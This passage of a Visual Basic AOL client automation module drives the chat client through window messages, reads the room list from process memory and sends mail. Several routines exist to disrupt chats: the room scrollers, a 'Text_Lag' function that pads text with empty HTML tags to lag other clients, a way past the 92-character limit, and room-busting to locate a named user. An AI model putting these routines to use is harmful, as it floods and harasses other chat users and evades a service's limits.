Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
End If
Pause Val(Delay)
If RoomForceEnter& >= StopAfterSoManyTries& Then Exit Do
Loop Until FindRoom& <> 0&
Exit Function
End If
End If
End Function
Public Function RoomGetText() As String
        Dim RichTxt As Long
RichTxt& = FindWindowEx(FindRoom&, 0&, "RICHCNTL", vbNullString)
RoomGetText$ = GetText(RichTxt&)
End Function
Public Sub RoomGreeter(Optional MessageForeGreet As String = "Welcome, ", Optional MessageEndGreet As String = ", how have you been?")
        Dim ErrorArgg, SavedEntries As String
On Error GoTo ErrorArgg
If RoomLastLineScreenName$ = "OnlineHost" Then
If InStr(RoomLastLineMessage$, " has entered the room") <> 0& Then
If InStr(SavedEntries$, Mid(RoomLastLineMessage$, 1, InStr(RoomLastLineMessage$, " has") - 1)) <> 0 Then Exit Sub
SavedEntries$ = SavedEntries$ & RoomLastLineScreenName$
RoomSend MessageForeGreet$ & Mid(RoomLastLineMessage$, 1, InStr(RoomLastLineMessage$, " has") - 1) & MessageEndGreet$
Pause 2
Exit Sub
End If
End If
ErrorArgg:
End Sub
Public Sub RoomIgnoreByIndex(ListIndex As Long, Optional IgnoreOrUnignore As Boolean = True)
'same as chatignorebyindex except this gives you an option of unignoring and ignoring
        Dim RoomList As Long, AboutWindow As Long, CheckBox As Long
        Dim CheckValue As Boolean
RoomList& = FindWindowEx(FindRoom&, 0&, "_AOL_listbox", vbNullString)
Call SendMessageLong(RoomList&, LB_SETCURSEL, ListIndex&, 0&)
Call PostMessage(RoomList&, WM_LBUTTONDBLCLK, 0&, 0&)
Do: DoEvents
AboutWindow& = FindAboutWindow&
CheckBox& = FindWindowEx(AboutWindow&, 0&, "_AOL_Checkbox", vbNullString)
Loop Until AboutWindow& <> 0& And CheckBox& <> 0&
If IgnoreOrUnignore = True Then
Do: DoEvents
CheckValue = CheckBoxGetValue(CheckBox&)
DoEvents
Call PostMessage(CheckBox&, WM_LBUTTONDOWN, 0&, 0&)
DoEvents
Call PostMessage(CheckBox&, WM_LBUTTONUP, 0&, 0&)
DoEvents
Loop Until CheckValue = True
ElseIf IgnoreOrUnignore = False Then
Do: DoEvents
CheckValue = CheckBoxGetValue(CheckBox&)
DoEvents
Call PostMessage(CheckBox&, WM_LBUTTONDOWN, 0&, 0&)
DoEvents
Call PostMessage(CheckBox&, WM_LBUTTONUP, 0&, 0&)
DoEvents
Loop Until CheckValue = False
End If
DoEvents
Call PostMessage(AboutWindow&, WM_CLOSE, 0&, 0&)
End Sub
Public Sub Roomlink(Address As String, LinkTxt As String)
'sends a link to the room
RoomSend "< a href=" & Chr(34) & Address$ & Chr(34) & ">" & LinkTxt$ & "</a>"
End Sub
Public Sub RoomIgnoreByScreenName(ScreenName As String, Optional IgnoreOrUnignore As Boolean = True)
        Dim Elwgf As Long, ListHoldItem As Long, Name As String
        Dim ListHoldName As Long, BytesRead As Long, ListHandle As Long
        Dim ProcessThread As Long, SearchIndex As Long
ListHandle& = FindWindowEx(FindRoom&, 0&, "_AOL_Listbox", vbNullString)
Call GetWindowThreadProcessId(ListHandle&, Elwgf&)
ProcessThread& = OpenProcess(Op_Flags, False, Elwgf&)
If ProcessThread& Then
For SearchIndex& = 0 To ListCount(ListHandle&) - 1
Name$ = String(4, vbNullChar)
ListHoldItem& = SendMessage(ListHandle&, LB_GETITEMDATA, ByVal CLng(SearchIndex&), 0&)
ListHoldItem& = ListHoldItem& + 24
Call ReadProcessMemory(ProcessThread&, ListHoldItem&, Name$, 4, BytesRead&)
Call RtlMoveMemory(ListHoldItem&, ByVal Name$, 4)
ListHoldItem& = ListHoldItem& + 6
Name$ = String(16, vbNullChar)
Call ReadProcessMemory(ProcessThread&, ListHoldItem&, Name$, Len(Name$), BytesRead&)
Name$ = Left(Name$, InStr(Name$, vbNullChar) - 1)
If LCase(TrimSpaces(Name$)) <> LCase(TrimSpaces(usersn$)) And LCase(TrimSpaces(Name$)) = LCase(TrimSpaces(ScreenName$)) Then
SearchIndex& = SearchIndex&
Call RoomIgnoreByIndex(SearchIndex&, IgnoreOrUnignore)
Exit Sub
End If
Next SearchIndex&
Call CloseHandle(ProcessThread&)
End If
End Sub
Public Function RoomIsPrivate() As Boolean
'Checks to see if the aol room is private
        Dim AoImage As Long
AoImage& = FindWindowEx(FindRoom&, 0&, "_AOL_Image", vbNullString)
If IsWindowVisible(AoImage&) = False Then
RoomIsPrivate = True
ElseIf IsWindowVisible(AoImage&) = True Then
RoomIsPrivate = False
End If
End Function
Public Function RoomLastLineFull() As String
If FindRoom& = 0& Then Exit Function
        Dim Number As Long, PrepString As String
Number& = StringCount(RoomGetText$, vbCr)
PrepString$ = GetInstance(RoomGetText$, vbCr, Number& + 1)
RoomLastLineFull$ = ReplaceCharacters(PrepString$, vbTab, "    ")
End Function
Public Function RoomLastLineFullIndex(Optional Line As Long = 0) As String
If FindRoom& = 0& Then Exit Function
        Dim Count As Long, PrepString As String
Count& = StringCount(RoomGetText$, vbCr)
PrepString$ = GetInstance(RoomGetText$, vbCr, Count& - Line&)
RoomLastLineFullIndex$ = ReplaceCharacters(PrepString$, vbTab, "    ")
End Function
Public Function RoomLastLineMessage() As String
If FindRoom& = 0& Then
Exit Function
ElseIf FindRoom& <> 0& Then
RoomLastLineMessage$ = Mid(RoomLastLineFull$, InStr(RoomLastLineFull$, ":") + 6)
Exit Function
End If
End Function
Public Function RoomLastLineMessageIndex(Optional Line As Long = 0) As String
If FindRoom& = 0& Then Exit Function
RoomLastLineMessageIndex$ = Mid(RoomLastLineFullIndex$(Line&), InStr(RoomLastLineFullIndex$(Line&), ":") + 6)
End Function
Public Function RoomLastLineScreenName() As String
If FindRoom& = 0& Then Exit Function
RoomLastLineScreenName$ = Mid(RoomLastLineFull$, 1, InStr(RoomLastLineFull$, ":") - 1)
End Function
Public Function RoomLastLineScreenNameIndex(Optional Line As Long = 0) As String
If FindRoom& = 0& Then Exit Function
RoomLastLineScreenNameIndex$ = Mid(RoomLastLineFullIndex$(Line&), 1, InStr(RoomLastLineFullIndex$(Line&), ":") - 1)
End Function
Public Sub RunMenuByString(ParentWindow As Long, StringToGet As String)
        Dim MenuHandle As Long, MenuItemCount As Long, NextItem As Long
        Dim SubMenu As Long, NextMenuItemCount As Long, MenuItemId As Long
        Dim NextNextItem As Long, NextMenuItemId As Long, FixedString As String
MenuHandle& = GetMenu(ParentWindow&)
MenuItemCount& = GetMenuItemCount(MenuHandle&)
For NextItem& = 0& To MenuItemCount& - 1
SubMenu& = GetSubMenu(MenuHandle&, NextItem&)
NextMenuItemCount& = GetMenuItemCount(SubMenu&)
For NextNextItem& = 0& To NextMenuItemCount& - 1
NextMenuItemId& = GetMenuItemID(SubMenu&, NextNextItem&)
FixedString$ = String(100, " ")
Call GetMenuString(SubMenu&, NextMenuItemId&, FixedString$, 100, 1)
If InStr(LCase(FixedString$), LCase(StringToGet$)) Then
Call SendMessageLong(ParentWindow&, WM_COMMAND, NextMenuItemId&, 0&)
Exit Sub
End If
Next NextNextItem&
Next NextItem&
End Sub
Function RoomWavy(Text As String)
'Makes wavy text
        Dim wgf As String, A As Long, b As String, C As String, d As String, E As String, wgf2 As Long
wgf$ = Text
A& = Len(wgf$)
For wgf2& = 1 To A Step 4
b$ = Mid$(wgf$, wgf2&, 1)
C$ = Mid$(wgf$, wgf2& + 1, 1)
d$ = Mid$(wgf$, wgf2& + 2, 1)
E$ = Mid$(wgf$, wgf2& + 3, 1)
wgf$ = wgf$ & "<sup>" & b$ & "</sup>" & C$ & "<sub>" & d$ & "</sub>" & E$
Next wgf2&
RoomWavy = wgf$
End Function
Function RoomBoldFirstLetter(Text As String)
'Makes wavy text
        Dim wgf As String, A As Long, b As String, C As String, d As String, E As String, wgf2 As Long
wgf$ = Text
A& = Len(wgf$)
For wgf2& = 1 To A Step 4
b$ = Mid$(wgf$, wgf2&, 1)
C$ = Mid$(wgf$, wgf2& + 1, 1)
d$ = Mid$(wgf$, wgf2& + 2, 1)
E$ = Mid$(wgf$, wgf2& + 3, 1)
wgf$ = wgf$ & "<sup>" & b$ & "</sup>" & C$ & "<sub>" & d$ & "</sub>" & E$
Next wgf2&
RoomBoldFirstLetter = wgf$
End Function
Public Function RoomName() As String
'Gets room name
If FindRoom& = 0& Then Exit Function
RoomName$ = GetCaption(FindRoom&)
End Function
Public Sub ScrollProfile(SN As String, Optional Delay As Single = "0.6")
'Scrolls a profile
Call ScrollString(ProfileGet(SN$), Delay)
End Sub
Sub SendCharNum(win As String, chars As String)
        Dim wgf As String
wgf$ = SendMessageByNum(win$, WM_CHAR, chars$, 0)
End Sub
Public Sub ScrollSplitString(SendString As String, Optional Delay As Single = "0.6")
        Dim LenString As Long
If Len(SendString$) <= 92 Then
RoomSend SendString$
Exit Sub
ElseIf Len(SendString$) > 92 Then
RoomSend Mid(SendString$, 1, 92)
Call Pause(Val(Delay))
For LenString& = 1 To Len(SendString$) / 92
RoomSend Mid(SendString$, (LenString& * 92) + 1, (LenString& * 92))
Call Pause(Val(Delay))
Next LenString&
End If
End Sub
Public Sub ScrollString(ScrollThis As String, Optional Delay As Single = ".6")
        Dim PreString  As String, handler
On Error GoTo handler
If Mid(ScrollThis$, Len(ScrollThis$), 1) <> vbLf Then ScrollThis$ = ScrollThis$ & vbCrLf
Do While InStr(ScrollThis$, vbCr) <> 0&
If TrimSpaces(Mid(ScrollThis$, 1, InStr(ScrollThis$, vbCr) - 1)) <> "" Then
If Len(Mid(ScrollThis$, 1, InStr(ScrollThis$, vbCr) - 1)) > 92 Then
Call ScrollSplitString(Mid(ScrollThis$, 1, InStr(ScrollThis$, vbCr) - 1))
ElseIf Len(Mid(ScrollThis$, 1, InStr(ScrollThis$, vbCr) - 1)) <= 92 Then
Call RoomSend(Mid(ScrollThis$, 1, InStr(ScrollThis$, vbCr) - 1))
Pause Val(Delay)
End If
End If
ScrollThis$ = Mid(ScrollThis$, InStr(ScrollThis$, vbCrLf) + 2)
Loop
handler:
End Sub

Public Sub RoomSend(SendString As String, Optional ClearBefore As Boolean = False)
'I like this better than chatsend it clears the text box before sending if specified, its what I use
If FindRoom& = 0& Then Exit Sub
        Dim RichTxt1 As Long, RichTxt2 As Long, TxtOfRich As String
RichTxt1& = FindWindowEx(FindRoom&, 0&, "RICHCNTL", vbNullString)
RichTxt2& = FindWindowEx(FindRoom&, RichTxt1&, "RICHCNTL", vbNullString)
If ClearBefore = True Then Call SendMessageByString(RichTxt2&, WM_SETTEXT, 0&, "")
Call SendMessageByString(RichTxt2&, WM_SETTEXT, 0&, SendString$)
Call SendMessageLong(RichTxt2&, WM_CHAR, ENTER_KEY, 0&)
End Sub
Public Sub RoomEntertainment(Name As String)
Keyword ("aol://2719:22-2-" & Name$)
End Sub
Public Sub RoomFreinds(Name As String)
Keyword ("aol://2719:34-2-" & Name$)
End Sub
Public Sub RoomLife(Name As String)
Keyword ("aol://2719:23-2-" & Name$)
End Sub
Public Sub RoomNews(Name As String)
Keyword ("aol://2719:24-2-" & Name$)
End Sub
Public Sub RoomPlaces(Name As String)
Keyword ("aol://2719:25-2-" & Name$)
End Sub
Public Sub RoomRomance(Name As String)
Keyword ("aol://2719:26-2-" & Name$)
End Sub
Public Sub RoomSpecialInsterests(Name As String)
Keyword ("aol://2719:27-2-" & Name$)
End Sub
Public Sub RoomTownSquare(Name As String)
Keyword ("aol://2719:21-2-" & Name$)
End Sub
Public Function RoomSendRich() As Long
        Dim RichText As Long
RichText& = FindWindowEx(FindRoom&, 0&, "RICHCNTL", vbNullString)
RoomSendRich& = FindWindowEx(FindRoom&, RichText&, "RICHCNTL", vbNullString)
End Function
Public Sub RoomSendSafe(SendString As String, Optional SendAfterPlaceBack As Boolean = False)
'Makes sure the box is clear will grab then place back the text that was in ther after your message was sent
If FindRoom& = 0& Then Exit Sub
        Dim RichText1 As Long, RichText2 As Long, TextOfRich As String
RichText1& = FindWindowEx(FindRoom&, 0&, "RICHCNTL", vbNullString)
RichText2& = FindWindowEx(FindRoom&, RichText1&, "RICHCNTL", vbNullString)
TextOfRich$ = GetText(RichText2&)
Call SendMessageByString(RichText2&, WM_CLEAR, 0&, 0&)
Call SendMessageByString(RichText2&, WM_SETTEXT, 0&, SendString$)
Call SendMessageLong(RichText2&, WM_CHAR, ENTER_KEY, 0&)
Call SendMessageByString(RichText2&, WM_SETTEXT, 0&, TextOfRich$)
If SendAfterPlaceBack = True Then Call SendMessageLong(RichText2&, WM_CHAR, ENTER_KEY, 0&)
End Sub
Public Function RoomSearch(ScreenName As String) As Boolean
        Dim Process As Long, ListHoldItem As Long, Name As String
        Dim ListHoldName As Long, BytesRead As Long, ListHandle As Long
        Dim ProcessThread As Long, SearchIndex As Long
ListHandle& = FindWindowEx(FindRoom&, 0&, "_AOL_Listbox", vbNullString)
Call GetWindowThreadProcessId(ListHandle&, Process&)
ProcessThread& = OpenProcess(Op_Flags, False, Process&)
If ProcessThread& Then
For SearchIndex& = 0 To ListCount(ListHandle&) - 1
Name$ = String(4, vbNullChar)
ListHoldItem& = SendMessage(ListHandle&, LB_GETITEMDATA, ByVal CLng(SearchIndex&), 0&)
ListHoldItem& = ListHoldItem& + 24
Call ReadProcessMemory(ProcessThread&, ListHoldItem&, Name$, 4, BytesRead&)
Call RtlMoveMemory(ListHoldItem&, ByVal Name$, 4)
ListHoldItem& = ListHoldItem& + 6
Name$ = String(16, vbNullChar)
Call ReadProcessMemory(ProcessThread&, ListHoldItem&, Name$, Len(Name$), BytesRead&)
Name$ = Left(Name$, InStr(Name$, vbNullChar) - 1)
If LCase(TrimSpaces(ScreenName$)) Like LCase(TrimSpaces(Name$)) Then
RoomSearch = True
Exit Function
End If
Next SearchIndex&
Call CloseHandle(ProcessThread&)
End If
End Function
Public Function RoomLocator(ScreenName As String, RoomList As Control, Optional BustIfFull As Boolean = True, Optional LimitTriesOnBust As Long = "20") As String
        Dim ListIndex As Long
If RoomSearch(ScreenName$) = True Then
RoomLocator$ = ScreenName & " has been found"
Exit Function
Else
RoomLocator$ = ScreenName & " was not found"
End If
For ListIndex& = 0 To RoomList.ListCount - 1
If BustIfFull = False Then
Call Keyword("aol://2719:2-2-" & RoomList.List(ListIndex&))
WaitForOKOrRoom RoomList.List(ListIndex&)
ElseIf BustIfFull = True Then
Call RoomForceEnter("aol://2719:2-2-", RoomList.List(ListIndex&), False, 0.2, LimitTriesOnBust&)
End If
Yield 0.6
If RoomSearch(ScreenName$) = True Then
Yield 0.6
RoomLocator$ = ScreenName & " has been found"
Exit Function
Else
RoomLocator$ = ScreenName & " was not found"
End If
Yield 2
Next ListIndex&
End Function
Public Sub RoomSetPreferences(MembersArrive As Boolean, MembersLeave As Boolean, Doublespace As Boolean, Alphabatize As Boolean, sounds As Boolean)
'Sets your room prefernes
        Dim PreferencesWindow As Long, ChatPreferencesWindow As Long, AoIcon1 As Long
        Dim AoIcon2 As Long, MembersArriveCheckBox As Long, MembersLeaveCheckBox As Long
        Dim DoubleSpaceCheckBox As Long, AlphabatizeCheckBox As Long, SoundsCheckBox As Long
        Dim MessageOk As Long, OKButton As Long, AoFrame As Long, AoMDI As Long
If FindRoom& = 0& Then
Call PopUpIcon(5, "P")
Do: DoEvents
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
PreferencesWindow& = FindWindowEx(AoMDI&, 0&, "AOL Child", "Preferences")
AoIcon1& = NextOfClassByCount(PreferencesWindow&, "_AOL_Icon", 5)
Loop Until PreferencesWindow& <> 0& And AoIcon1& <> 0&
Call PostMessage(AoIcon1&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon1&, WM_LBUTTONUP, 0&, 0&)
ElseIf FindRoom& <> 0& Then
AoIcon1& = NextOfClassByCount(FindRoom&, "_AOL_Icon", 10)
Call PostMessage(AoIcon1&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon1&, WM_LBUTTONUP, 0&, 0&)
End If
Do: DoEvents
ChatPreferencesWindow& = FindWindow("_AOL_Modal", "Chat Preferences")
MembersArriveCheckBox& = FindWindowEx(ChatPreferencesWindow&, 0&, "_AOL_Checkbox", vbNullString)
MembersLeaveCheckBox& = FindWindowEx(ChatPreferencesWindow&, MembersArriveCheckBox&, "_AOL_Checkbox", vbNullString)
DoubleSpaceCheckBox& = FindWindowEx(ChatPreferencesWindow&, MembersLeaveCheckBox&, "_AOL_Checkbox", vbNullString)
AlphabatizeCheckBox& = FindWindowEx(ChatPreferencesWindow&, DoubleSpaceCheckBox&, "_AOL_Checkbox", vbNullString)
SoundsCheckBox& = FindWindowEx(ChatPreferencesWindow&, AlphabatizeCheckBox&, "_AOL_Checkbox", vbNullString)
AoIcon2& = FindWindowEx(ChatPreferencesWindow&, 0&, "_AOL_Icon", vbNullString)
Loop Until ChatPreferencesWindow& <> 0& And MembersArriveCheckBox& <> 0& And MembersLeaveCheckBox& <> 0& And DoubleSpaceCheckBox& <> 0& And AlphabatizeCheckBox& <> 0& And SoundsCheckBox& <> 0& And AoIcon2& <> 0&
Call CheckBoxSetValue(MembersArriveCheckBox&, MembersArrive)
Call CheckBoxSetValue(MembersLeaveCheckBox&, MembersLeave)
Call CheckBoxSetValue(DoubleSpaceCheckBox&, Doublespace)
Call CheckBoxSetValue(AlphabatizeCheckBox&, Alphabatize)
Call CheckBoxSetValue(SoundsCheckBox&, sounds)
Call PostMessage(AoIcon2&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon2&, WM_LBUTTONUP, 0&, 0&)
If PreferencesWindow& <> 0& Then
Call PostMessage(PreferencesWindow&, WM_CLOSE, 0&, 0&)
End If
Do: DoEvents
MessageOk& = FindWindow("#32770", "America Online")
OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
Loop Until MessageOk& <> 0& And OKButton& <> 0& Or FindWindow("_AOL_Modal", "Chat Preferences") = 0&
If MessageOk& <> 0& Then
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
Exit Sub
End If
End Sub
Public Sub SetText(WinHandle As Long, StringToSet As String, Optional ClearBefore As Boolean = True)
If ClearBefore = True Then Call SendMessageByString(WinHandle&, WM_SETTEXT, 0&, "")
Call SendMessageByString(WinHandle&, WM_SETTEXT, 0&, StringToSet$)
End Sub
Public Sub SendMail(Person As String, Subject As String, message As String, Optional CheckReturnReceipts As Boolean = False)
        Dim AoFrame As Long, AoToolbar As Long, Toolbar As Long
        Dim AoIcon1 As Long, AoEdit1 As Long, AoMDI As Long
        Dim AoEdit2 As Long, AoEdit3 As Long, RichText As Long
        Dim AoIcon2 As Long, AoModal As Long, AoIcon3 As Long
        Dim CheckBox As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoToolbar& = FindWindowEx(AoFrame&, 0&, "AOL Toolbar", vbNullString)
Toolbar& = FindWindowEx(AoToolbar, 0&, "_AOL_Toolbar", vbNullString)
AoIcon1& = NextOfClassByCount(Toolbar&, "_AOL_Icon", 2)
Call PostMessage(AoIcon1&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon1&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
AoEdit1& = FindWindowEx(FindSendWindow&, 0&, "_AOL_Edit", vbNullString)
AoEdit2& = FindWindowEx(FindSendWindow&, AoEdit1&, "_AOL_Edit", vbNullString)
AoEdit3& = FindWindowEx(FindSendWindow&, AoEdit2&, "_AOL_Edit", vbNullString)
RichText& = FindWindowEx(FindSendWindow&, 0&, "RICHCNTL", vbNullString)
AoIcon2& = NextOfClassByCount(FindSendWindow&, "_AOL_Icon", 14)
Loop Until FindSendWindow& <> 0& And AoEdit1& <> 0& And AoEdit2& <> 0& And AoEdit3& <> 0& And RichText& <> 0& And AoIcon2& <> 0&
Call WinMinimize(FindSendWindow&)
Call SendMessageByString(AoEdit1&, WM_SETTEXT, 0&, Person$)
Call SendMessageByString(AoEdit3&, WM_SETTEXT, 0&, Subject$)
Call SendMessageByString(RichText&, WM_SETTEXT, 0&, message$)
If CheckReturnReceipts = True Then
CheckBox& = FindWindowEx(FindSendWindow&, 0&, "_AOL_Checkbox", vbNullString)
Call PostMessage(CheckBox&, BM_SETCHECK, True, 0&)
End If
Call PostMessage(AoIcon2&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon2&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
AoModal& = FindWindow("_AOL_Modal", vbNullString)
AoIcon3& = FindWindowEx(AoModal&, 0&, "_AOL_Icon", vbNullString)
Loop Until AoModal& <> 0& And AoIcon3& <> 0&
If AoModal& <> 0& And FindWindowEx(AoMDI&, 0&, "AOL Child", "Write Mail") = 0& Then
Call PostMessage(AoIcon3&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon3&, WM_LBUTTONUP, 0&, 0&)
Exit Sub
ElseIf FindWindowEx(AoMDI&, 0&, "AOL Child", "Write Mail") = 0& And AoModal& = 0& Then
Exit Sub
End If
End Sub
Sub SupaSend(Text As TextBox)
'sends over the 92 char limit
        Dim i As Long, A As String
For i& = 1 To 1
A$ = A$ + Text
Next
RoomSend (".<p=" & A$)
End Sub
Public Function StringCount(InThisString As String, FindString As String) As Long
        Dim LenString As Long, Number As Long
For LenString& = 1 To Len(InThisString$)
If InStr(LenString&, InThisString$, FindString$) = LenString& Then
Number& = Number& + 1
End If
Next LenString&
StringCount& = Number&
End Function
Public Sub StartButton(Visable As Boolean)
        Dim Tray As Long
        Dim StartButton As Long
Tray& = FindWindow("Shell_TrayWnd", "")
StartButton& = FindWindowEx(Tray&, 0, "Button", vbNullString)
Select Case Visable
Case True
Call ShowWindow(StartButton&, SW_SHOW)
Case False
Call ShowWindow(StartButton&, SW_Hide)
End Select
End Sub
Public Function StringSearch(InThisString As String, FindString As String) As Boolean
        Dim LenString As Long, Number As Long
If InStr(InThisString$, FindString$) <> 0& Then
StringSearch = True
Exit Function
ElseIf InStr(InThisString$, FindString$) = 0& Then
StringSearch = False
Exit Function
End If
End Function
Public Sub StopIt(DaPause As Long)
        Dim InitialTime As Long
InitialTime& = Timer
Do Until Timer - InitialTime& >= DaPause&
DoEvents
Loop
End Sub
Public Sub SendChat(Text As String)
'Sends Text To Chat
        Dim Rm As Long, AORich As Long, AORich2 As Long
Rm& = FindRoom&
AORich& = FindWindowEx(Rm, 0&, "RICHCNTL", vbNullString)
AORich2& = FindWindowEx(Rm, AORich, "RICHCNTL", vbNullString)
Call SendMessageByString(AORich2, WM_SETTEXT, 0&, Text$)
Call SendMessageLong(AORich2, WM_CHAR, ENTER_KEY, 0&)
End Sub
Public Sub ShowWelcomeWindow()
'UnHides the AoWelcome Window
        Dim AoFrame As Long, AoWelcome As Long, AoClient As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoClient& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
AoWelcome& = (FindWelcome)
WindowShow (AoWelcome&)
End Sub
Sub ShowAol()
'UnHides Aol
        Dim AoFrame As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(AoFrame&, 5)
End Sub
Public Sub SystemFonts(ListOrComboBox As Control)
'Shows system Fonts
        Dim CurrentFontNumber As Long
For CurrentFontNumber& = 0 To Screen.FontCount - 1
ListOrComboBox.AddItem Screen.Fonts(CurrentFontNumber&)
Next CurrentFontNumber&
End Sub
Public Sub SystemTrayAction()
With systray
.uFlags = Sys_Icon
.ucallbackMessage = WM_LBUTTONDOWN
Call MsgBox(usersn)
End With
End Sub
Public Sub SignOff()
    Dim AoFrame As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
Call RunMenuByString(AoFrame&, "&Sign Off")
End Sub
Public Sub ShowSignOnScreen()
    Dim AoFrame As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
Call RunMenuByString(AoFrame&, "&Sign On Screen")
End Sub
Public Sub SystemTrayAddIcon(Form As Form)
With systray
.cbSize = Len(systray)
.hWnd = Form.hWnd
.uId = vbNull
.uFlags = Sys_Icon Or Sys_Tip Or Sys_Message
.ucallbackMessage = WM_MOUSEMOVE
.hIcon = Form.icon
.szTip = Form.Caption & vbNullChar
End With
Call Shell_NotifyIcon(Sys_Add, systray)
End Sub
Public Sub SystemTrayRemoveIcon(Form As Form)
With systray
.hWnd = Form.hWnd
End With
Call Shell_NotifyIcon(Sys_Delete, systray)
End Sub
Public Function TimeOnline() As String
        Dim AoModal As Long, AoIcon As Long, AoStatic As Long
Call PopUpIcon(5, "O")
Do: DoEvents
AoModal& = FindWindow("_AOL_Modal", "America Online")
AoIcon& = FindWindowEx(AoModal&, 0, "_AOL_Icon", vbNullString)
AoStatic& = FindWindowEx(AoModal&, 0, "_AOL_Static", vbNullString)
Loop Until AoModal& <> 0& And AoIcon& <> 0& And AoStatic& <> 0&
TimeOnline$ = GetText(AoStatic&)
Call PostMessage(AoIcon&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(AoIcon&, WM_KEYUP, VK_SPACE, 0&)
End Function
Public Sub TaskBar(Visable As Boolean)
'Makes the Win9x task bar hide show
'true = hide, false = show
        Dim Tray As Long
        Dim Task As Long
        Dim Control As Long
Tray& = FindWindow("Shell_TrayWnd", "")
Task& = FindWindowEx(Tray&, 0, "MSTaskSwWClass", vbNullString)
Control& = FindWindowEx(Task&, 0, "SysTabControl32", vbNullString)
Select Case Visable
Case True
Call ShowWindow(Control&, SW_SHOW)
Case False
Call ShowWindow(Control&, SW_Hide)
End Select
End Sub
Function Text_Lag(Text As String)
'This makes each char. come in slow into the chat room
        Dim Inptxtrl As String, lenth As Integer
        Dim NewSent As String, NumSpc As Integer
        Dim NextChr As String
Let Inptxtrl$ = Text
Let lenth% = Len(Inptxtrl$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(Inptxtrl$, NumSpc%, 1)
Let NextChr$ = NextChr$ + "<HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML><HTML></HTML>"
Let NewSent$ = NewSent$ + NextChr$
Loop
Text_Lag = NewSent$               'You can change the font color to what ya like
RoomSend "</B></I></U><font color=#000000>" + Text_Lag + ""
End Function
Function Text_Spaced(Text As String)
'Puts a space between each char.      (im not putting in a text hacker there lame =( or a text elite
        Dim Inptxtrl As String, lenth As Integer
        Dim NewSent As String, NumSpc As Integer
        Dim NextChr As String
Let Inptxtrl$ = Text
Let lenth% = Len(Inptxtrl$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(Inptxtrl$, NumSpc%, 1)
Let NextChr$ = NextChr$ + " "
Let NewSent$ = NewSent$ + NextChr$
Loop
Text_Spaced = NewSent$
RoomSend "" + Text_Spaced + ""
End Function
Function Text_WTF(Text As String)
'This is my new txt thing kinda cool. It just screws up the text. I guess it could be an encrypter...
        Dim Inptxtrl As String, lenth As Integer
        Dim NewSent As String, NumSpc As Integer
        Dim NextChr As String
Let Inptxtrl$ = Text
Let lenth% = Len(Inptxtrl$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(Inptxtrl$, NumSpc%, 1)
If NextChr$ = "A" Then Let NextChr$ = "@"
If NextChr$ = "E" Then Let NextChr$ = "t"  'Note, I took a text hacker and I just screwed it all up, =)
If NextChr$ = "I" Then Let NextChr$ = "m"
If NextChr$ = "O" Then Let NextChr$ = "."
If NextChr$ = "U" Then Let NextChr$ = "u"
If NextChr$ = "b" Then Let NextChr$ = "a"
If NextChr$ = "c" Then Let NextChr$ = "g"
If NextChr$ = "d" Then Let NextChr$ = "w"
If NextChr$ = "z" Then Let NextChr$ = "q"
If NextChr$ = "f" Then Let NextChr$ = "F"
If NextChr$ = "g" Then Let NextChr$ = "G"
If NextChr$ = "h" Then Let NextChr$ = "s"
If NextChr$ = "y" Then Let NextChr$ = "Y"
If NextChr$ = "j" Then Let NextChr$ = "r"
If NextChr$ = "k" Then Let NextChr$ = "x"
If NextChr$ = "l" Then Let NextChr$ = "v"
If NextChr$ = "m" Then Let NextChr$ = "h"
If NextChr$ = "n" Then Let NextChr$ = "p"
If NextChr$ = "x" Then Let NextChr$ = "j"
If NextChr$ = "p" Then Let NextChr$ = "l"
If NextChr$ = "q" Then Let NextChr$ = "o"
If NextChr$ = "r" Then Let NextChr$ = "|2"
If NextChr$ = "s" Then Let NextChr$ = "L"
If NextChr$ = "t" Then Let NextChr$ = "|"
If NextChr$ = "w" Then Let NextChr$ = "\/\/"
If NextChr$ = "v" Then Let NextChr$ = "bl"
If NextChr$ = " " Then Let NextChr$ = "0"
Let NewSent$ = NewSent$ + NextChr$
Loop
Text_WTF = NewSent$
RoomSend "" + Text_WTF + ""
End Function
Public Function TrimSpaces(MainString As String) As String
        Dim NewMain As String, Instance As Long
NewMain$ = MainString$
Do While InStr(1, NewMain$, " ")
DoEvents
Instance& = InStr(1, NewMain$, " ")
NewMain$ = Left(NewMain$, (Instance& - 1)) & "" & Right(NewMain$, Len(NewMain$) - Instance&)
Loop
TrimSpaces$ = NewMain$
End Function
Public Function TrimNull(MainString As String) As String
        Dim NewMain As String, Instance As Long
NewMain$ = MainString$
Do While InStr(1, NewMain$, vbNullChar)
DoEvents
Instance& = InStr(1, NewMain$, vbNullChar)
